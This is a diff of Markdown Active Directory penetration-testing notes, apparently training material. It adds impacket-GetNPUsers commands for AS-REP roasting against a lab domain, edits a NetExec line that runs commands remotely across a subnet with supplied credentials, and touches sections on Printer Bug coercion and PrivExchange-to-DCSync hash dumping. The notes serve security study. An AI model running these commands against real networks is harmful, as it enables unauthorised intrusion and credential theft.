@@ -41,7 +41,7 @@ runas /netonly /user:<DOMAIN>\<USER> powershell.exe   # Use <USER> creds only fo
   
 # with NetExec
 # domain
-  nxc <smb/winrm/mssql/rdp/wmi> <SUBNET> -u <USER> -p 'P@ssw0rd' -x whoami -d <DOMAIN>
+nxc <smb/winrm/mssql/rdp/wmi> <SUBNET> -u <USER> -p 'P@ssw0rd' -x whoami -d <DOMAIN>
 # lcoal 
 nxc smb <SUBNET> -u UserNAme -p 'PASSWORDHERE' -x whoami --local-auth
 nxc smb <SUBNET> -u '' -p '' --local-auth
@@ -570,7 +570,7 @@ PrivExchange is an attack against Microsoft Exchange Server. A normal domain use
 
 the Exchange server account had special rights in Active Directory (==WriteDACL on the domain==). With those rights, the attacker can change permissions in AD and give their own account **DCSync rights**. DCSync rights allow an account to replicate passwords from the Domain Controller, which means the attacker can ==dump all hashes from Active Directory.== In the end, the attacker can fully compromise the domain and become Domain Admin.
 
-## 3- Printer Bug
+## Printer Bug
 
 - Any domain user can force a Windows server to **authenticate to an attacker-controlled host** by calling `RpcOpenPrinter` and `RpcRemoteFindFirstPrinterChangeNotificationEx` over the spooler’s named pipe (`\\server\pipe\spoolss`).
 - Because the Print Spooler runs as **SYSTEM**, it authenticates with its **machine account credentials**.
@@ -736,8 +736,15 @@ When performing user enumeration with `Kerbrute`, the tool will automatically re
 ```bash
 kerbrute userenum -d <domain.local> --dc <DC-IP> /opt/jsmith.txt 
 ```
-######  Using  GetNPUsers Hunting for Users with Kerberos Pre-auth Not Required
+######  Using  GetNPUsers (impacket-GetNPUsers) Hunting for Users with Kerberos Pre-auth Not Required
 we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as `jsmith.txt` into the tool
+
+```bash
+impacket-GetNPUsers INLANEFREIGHT.LOCAL/asmith:Welcome1 -dc-ip 172.16.5.5 
+
+impacket-GetNPUsers INLANEFREIGHT.LOCAL/asmith:Welcome1 -dc-ip 172.16.5.5 -request
+```
+
 ### 3-Group Policy Object (GPO) Abuse
 Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain
 
